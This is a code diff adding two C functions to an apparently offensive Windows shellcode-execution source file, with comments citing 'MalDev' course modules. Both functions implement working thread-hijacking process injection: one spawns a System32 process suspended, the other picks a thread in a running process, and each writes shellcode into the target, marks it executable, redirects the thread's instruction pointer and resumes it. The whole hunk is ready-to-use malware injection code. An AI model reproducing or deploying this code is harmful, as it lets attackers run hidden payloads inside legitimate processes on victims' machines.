@@ -281,3 +281,143 @@ BOOL LocalShellcodeExecSyscall(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode) 
 
     return TRUE;
 }
+
+// =============================================
+// Thread Hijacking (create suspended process + hijack main thread)
+// MalDev Module 34: no remote thread is created; the main thread's
+// instruction pointer is redirected to the shellcode instead.
+// =============================================
+BOOL ThreadHijackSuspendedInject(IN PBYTE pShellcode, IN SIZE_T sSize, IN LPCSTR lpTargetProcess) {
+
+    CHAR                lpPath[MAX_PATH * 2]    = { 0 };
+    CHAR                WnDr[MAX_PATH]          = { 0 };
+    STARTUPINFOA        Si                      = { .cb = sizeof(STARTUPINFOA) };
+    PROCESS_INFORMATION Pi                      = { 0 };
+    PVOID               pRemoteAddr             = NULL;
+    SIZE_T              sBytesWritten           = 0;
+    DWORD               dwOldProt               = 0;
+    CONTEXT             Ctx                     = { 0 };
+
+    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH))
+        return FALSE;
+    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpTargetProcess);
+
+    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &Si, &Pi))
+        return FALSE;
+
+    pRemoteAddr = VirtualAllocEx(Pi.hProcess, NULL, sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pRemoteAddr)
+        goto _Fail;
+    if (!WriteProcessMemory(Pi.hProcess, pRemoteAddr, pShellcode, sSize, &sBytesWritten))
+        goto _Fail;
+    SecureZeroMemory(pShellcode, sSize);
+    if (!VirtualProtectEx(Pi.hProcess, pRemoteAddr, sSize, PAGE_EXECUTE_READ, &dwOldProt))
+        goto _Fail;
+
+    Ctx.ContextFlags = CONTEXT_CONTROL;
+    if (!GetThreadContext(Pi.hThread, &Ctx))
+        goto _Fail;
+#ifdef _WIN64
+    Ctx.Rip = (DWORD64)pRemoteAddr;
+#else
+    Ctx.Eip = (DWORD)(ULONG_PTR)pRemoteAddr;
+#endif
+    if (!SetThreadContext(Pi.hThread, &Ctx))
+        goto _Fail;
+
+    ResumeThread(Pi.hThread);
+
+    CloseHandle(Pi.hProcess);
+    CloseHandle(Pi.hThread);
+    return TRUE;
+
+_Fail:
+    TerminateProcess(Pi.hProcess, 0);
+    CloseHandle(Pi.hProcess);
+    CloseHandle(Pi.hThread);
+    return FALSE;
+}
+
+// =============================================
+// Thread Hijacking via remote thread enumeration
+// MalDev Module 36: find an existing process, enumerate one of its threads,
+// suspend it, inject shellcode, redirect Rip, and resume.
+// =============================================
+BOOL ThreadHijackRemoteEnum(IN LPWSTR szProcessName, IN PBYTE pShellcode, IN SIZE_T sSize) {
+
+    HANDLE          hProcess        = NULL;
+    HANDLE          hThread         = NULL;
+    HANDLE          hSnap           = NULL;
+    DWORD           dwPid           = 0;
+    DWORD           dwTid           = 0;
+    THREADENTRY32   Thr             = { .dwSize = sizeof(THREADENTRY32) };
+    PVOID           pRemoteAddr     = NULL;
+    SIZE_T          sBytesWritten   = 0;
+    DWORD           dwOldProt       = 0;
+    CONTEXT         Ctx             = { 0 };
+
+    if (!GetRemoteProcessHandle(szProcessName, &dwPid, &hProcess))
+        return FALSE;
+
+    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) {
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    if (!Thread32First(hSnap, &Thr)) {
+        CloseHandle(hSnap);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    do {
+        if (Thr.th32OwnerProcessID == dwPid) {
+            dwTid    = Thr.th32ThreadID;
+            hThread  = OpenThread(THREAD_ALL_ACCESS, FALSE, dwTid);
+            break;
+        }
+    } while (Thread32Next(hSnap, &Thr));
+    CloseHandle(hSnap);
+
+    if (!hThread) {
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    pRemoteAddr = VirtualAllocEx(hProcess, NULL, sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pRemoteAddr)
+        goto _Fail;
+    if (!WriteProcessMemory(hProcess, pRemoteAddr, pShellcode, sSize, &sBytesWritten))
+        goto _Fail;
+    SecureZeroMemory(pShellcode, sSize);
+    if (!VirtualProtectEx(hProcess, pRemoteAddr, sSize, PAGE_EXECUTE_READ, &dwOldProt))
+        goto _Fail;
+
+    if (SuspendThread(hThread) == (DWORD)-1)
+        goto _Fail;
+
+    Ctx.ContextFlags = CONTEXT_CONTROL;
+    if (!GetThreadContext(hThread, &Ctx))
+        goto _Fail;
+#ifdef _WIN64
+    Ctx.Rip = (DWORD64)pRemoteAddr;
+#else
+    Ctx.Eip = (DWORD)(ULONG_PTR)pRemoteAddr;
+#endif
+    if (!SetThreadContext(hThread, &Ctx))
+        goto _Fail;
+
+    ResumeThread(hThread);
+
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    return TRUE;
+
+_Fail:
+    if (hThread)
+        CloseHandle(hThread);
+    if (hProcess)
+        CloseHandle(hProcess);
+    return FALSE;
+}
